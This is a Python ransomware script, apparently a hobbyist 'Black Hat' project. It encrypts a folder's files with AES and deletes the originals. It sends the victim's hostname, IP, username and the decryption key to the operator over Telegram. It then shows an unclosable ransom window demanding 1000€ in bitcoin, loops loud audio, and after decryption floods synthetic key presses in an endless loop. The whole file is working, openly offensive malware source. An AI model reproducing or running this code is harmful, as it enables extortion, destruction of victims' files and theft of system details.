import os, platform, sys
import shutil # for moving files
import pyAesCrypt # for encryption
import secrets
import tkinter as tk
from tkinter import *
from tkinter import messagebox
from pathlib import Path
from art import *
from termcolor import colored
import socket
from sendTelegramMessage import sendTelegramMessage
import winsound
import threading
import pyautogui
import tkinter.simpledialog
import win32api
import win32con











print(colored (text2art("Black Hat").center(60),'cyan'))
print(colored("ransomeware created by unkown".center(50),'green'))




# play music in background
def play_music():
    winsound.PlaySound("music.wav", winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
    pyautogui.press('volumeup', presses=50)
    
######## decrypt ########

# decrypt function 
def decrypt():
    # Get the folders to decrypt
    folders_path = [
        # warning: the path will be crypt if you use the home path
        str(os.path.join(Path.home(), "\\Users\\Olie\\OneDrive\\Bureau\\test ransonware"))
    ]


    # Get the key
    root = tk.Tk()
    root.withdraw()
    # add button on tkinter.simpledialog.askstring
    key = tkinter.simpledialog.askstring("Encrypt files", "To get the key, you must first pay 1000€", parent=root)



    # Decrypt every file in each folder
    for folder_path in folders_path:
        for file in os.listdir(folder_path):
            bufferSize = 64*1024
            # Get the path for the current file
            file_path = os.path.join(folder_path, file)
            if file.endswith(".aes"):
                # Decrypt the file
                pyAesCrypt.decryptFile(file_path, file_path[:-4], key, bufferSize)
                # if key is wrong show message, when message is closed, reshow the key input
                if os.path.exists(file_path[:-4]) == False:
                    messagebox.showinfo("Encrypt files", "Wrong key", parent=root, command=root)
                    key = tkinter.simpledialog.askstring("Encrypt files", "To get the key, you must first pay 1000€", parent=root)
                    pyAesCrypt.decryptFile(file_path, file_path[:-4], key, bufferSize)
                # Move the decrypted file and remove prefix "encrypted_"
                destination_path = os.path.join(folder_path, file[:-4].replace("encrypted_", ""))
                shutil.move(file_path[:-4], destination_path)
                # Delete the encrypted file
                os.remove(file_path)
                show_end()



index = 0
txt = ['T|', 'Th|', 'Tha|', 'Than|','Thank|', 'Thank\'|', 'Thank\'s|', 'Thank\'s |', 'Thank\'s b|', 'Thank\'s bu|', 'Thank\'s bud|', 'Thank\'s budd|', 'Thank\'s buddy|', 'Thank\'s buddy !|', 'Thank\'s buddy !!|']
# create a final window for telling bye bye
def start_animation():
    global index, text_animation_lb, loop
    if not index + 1 > len(txt):
        text_animation_lb.config(text=txt[index])
        index += 1
        loop.after(100, update_animation)
    else:
        index = 0
        text_animation_lb.config(text="|")
        loop.after(100, update_animation)

def update_animation():
    start_animation()

def create_window():
    global text_animation_lb, loop
    loop = tk.Tk()
    loop.attributes('-fullscreen', True)
    loop.protocol("WM_DELETE_WINDOW", lambda: None)
    loop.title("bisous <3")
    loop.geometry("500x400")
    loop.tk_setPalette('black')
    text_animation_lb = tk.Label(loop, text="|", font=("Bold", 50))
    text_animation_lb.pack(fill='both', expand=True)
    loop.after(1000, update_animation)
    loop.mainloop()
    # define the flag KEYEVENTF_SCANCODE to simulate a key press
    flag = win32con.KEYEVENTF_SCANCODE

    # block all keys in infinite loop
    while True:
        for i in range(0, 256):
            win32api.keybd_event(i, 0, flag, 0)
            win32api.keybd_event(i, 0, flag | win32con.KEYEVENTF_KEYUP, 0)








def show_end():
    global window
    window = Tk()
    lbl=Label(window, text="All files in the folders have been decrypted.")
    lbl.place(relx=0.5, rely=0.2, anchor=CENTER)
    window.title('Decryption Complete')
    btn = tk.Button(window, text="OK" , command=create_window)
    btn.place(relx=0.5, rely=0.5, anchor=CENTER)
    window.geometry("300x100")
    window.mainloop()
    

######## encrypt ########

# Get the path for the folders containing the files to be encrypted:
folders_path = [
    # str(os.path.join(Path.home(), "Downloads")),
    str(os.path.join(Path.home(), "\\Users\\Olie\\OneDrive\\Bureau\\test ransonware"))
]

# Generate a key
key = secrets.token_hex(16)

# system information
system = platform.uname()
node = system.node
release = system.release
ip = socket.gethostbyname(socket.gethostname())
username = os.getlogin()

# send telegram message
sendTelegramMessage(node, release, key, ip, username)

# Encrypt every file in the folders
for folder_path in folders_path:
    for file in os.listdir(folder_path):
        bufferSize = 64*1024
        # Get the path for the current file
        file_path = os.path.join(folder_path, file)
        if not file.endswith(".aes"):
            # Encrypt the file
            pyAesCrypt.encryptFile(file_path, file_path+".aes", key, bufferSize)
            # Move the encrypted file
            destination_path = os.path.join(folder_path,"encrypted_"+file+".aes")
            shutil.move(file_path+".aes", destination_path)
            # Delete the original file
            os.remove(file_path)



# display message and execute decrypt.py
def show_message_and_decrypt():
    window=Tk()
    # play music in background
    t1 = threading.Thread(target=play_music)
    t1.start()
    btn_decrypt=Button(window, text="Decrypt files", command=decrypt, fg='blue')
    btn_pay=Button(window, text="Pay the ransom", command=lambda: os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ"))
    btn_decrypt.place(relx=0.5, rely=0.4, anchor=CENTER)
    btn_pay.place(relx=0.5, rely=0.6, anchor=CENTER)
    lbl=Label(window, text="To decrypt the files, you must pay 1000€ in bitcoin, click on the button below to pay the ransom.", font=("Helvetica", 12))
    lbl.place(x=60, y=50)
    window.title('Encryption Complete')
    window.geometry("950x400")
    window.protocol("WM_DELETE_WINDOW", lambda: None)
    window.resizable(0, 0)
    t1.join()
    window.mainloop()


        
   
    

root = tk.Tk()
root.withdraw()
root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
# call show_message_and_decrypt function when OK is clicked
messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted. Click OK to decrypt the files.")
show_message_and_decrypt()











